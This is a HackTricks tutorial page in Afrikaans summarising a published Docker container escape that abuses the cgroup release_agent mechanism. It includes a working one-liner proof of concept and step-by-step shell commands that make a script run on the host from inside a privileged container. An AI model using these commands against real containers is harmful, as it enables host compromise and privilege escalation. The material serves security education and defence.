# Docker release\_agent cgroups escape

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


**Vir verdere besonderhede, verwys na die** [**oorspronklike blogpos**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Dit is net 'n opsomming:

Oorspronklike PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Die bewys van konsep (PoC) demonstreer 'n metode om cgroups te benut deur 'n `release_agent` lêer te skep en sy aanroep te aktiveer om arbitrêre opdragte op die houer gasheer uit te voer. Hier is 'n uiteensetting van die stappe wat betrokke is:

1. **Bereid die Omgewing Voor:**
* 'n Gids `/tmp/cgrp` word geskep om as 'n monteerpunt vir die cgroup te dien.
* Die RDMA cgroup-beheerder word op hierdie gids gemonteer. In die geval van afwesigheid van die RDMA-beheerder, word dit voorgestel om die `memory` cgroup-beheerder as 'n alternatief te gebruik.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Stel die Kind Cgroup op:**
* 'n Kind cgroup met die naam "x" word binne die gemonteerde cgroup-gids geskep.
* Kennisgewings word geaktiveer vir die "x" cgroup deur 1 in sy notify\_on\_release-lêer te skryf.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Konfigureer die Vrylating Agent:**
* Die pad van die houer op die gasheer word verkry uit die /etc/mtab-lêer.
* Die release\_agent-lêer van die cgroup word dan gekonfigureer om 'n skrif met die naam /cmd uit te voer wat op die verkryde gasheerpad geleë is.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Skep en Konfigureer die /cmd Skrip:**
* Die /cmd skrip word binne die houer geskep en is geconfigureer om ps aux uit te voer, terwyl die uitvoer na 'n lêer met die naam /output in die houer herlei word. Die volle pad van /output op die gasheer word gespesifiseer.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Trigger die Aanval:**
* 'n Proses word binne die "x" kind cgroup geinitieer en word onmiddellik beëindig.
* Dit aktiveer die `release_agent` (die /cmd skrip), wat ps aux op die gasheer uitvoer en die uitvoer na /output binne die houer skryf.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
